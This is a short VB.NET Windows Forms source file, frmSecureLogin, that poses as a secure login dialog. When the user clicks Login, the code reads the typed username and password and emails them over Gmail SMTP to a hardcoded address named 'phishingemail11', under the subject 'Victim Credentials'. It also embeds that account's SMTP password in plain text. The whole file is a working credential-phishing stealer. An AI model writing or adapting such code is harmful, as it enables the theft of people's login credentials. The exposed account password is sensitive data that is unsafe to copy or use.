Imports System.Net
Imports System.Net.Mail
Public Class frmSecureLogin
    Dim username As String = ""
    Dim password As String = ""
    Private Sub btnLogin_Click(sender As Object, e As EventArgs) Handles btnLogin.Click

        Dim MyMailMessage As New MailMessage()

        Try
            username = txtUsername.Text
            password = txtPassword.Text

            Dim SendingAddress As MailAddress = New MailAddress("phishingemail11@gmail.com")

            MyMailMessage.From = SendingAddress
            'MyMailMessage.To.Add(txtUsername.Text
            MyMailMessage.To.Add("Phishingemail11@gmail.com")
            MyMailMessage.Subject = "Victim Credentials"
            MyMailMessage.Body = "username: " & username & vbNewLine & "password: " & password

            Dim MySMTP As New SmtpClient("smtp.gmail.com")
            MySMTP.Port = 587
            MySMTP.EnableSsl = True

            Dim MyCredential As NetworkCredential = New NetworkCredential("phishingemail11@gmail.com", "bfpjrobzdljwnzdi")

            MySMTP.Credentials = MyCredential
            MySMTP.Send(MyMailMessage)

            ' MessageBox.Show("This email was sent.")
            txtUsername.Select()
        Catch ex As Exception
            MessageBox.Show("Login fails. " & ex.Message, "Error")
        End Try

    End Sub

    Private Sub btnExit_Click(sender As Object, e As EventArgs) Handles btnExit.Click
        Me.Close()
    End Sub

End Class
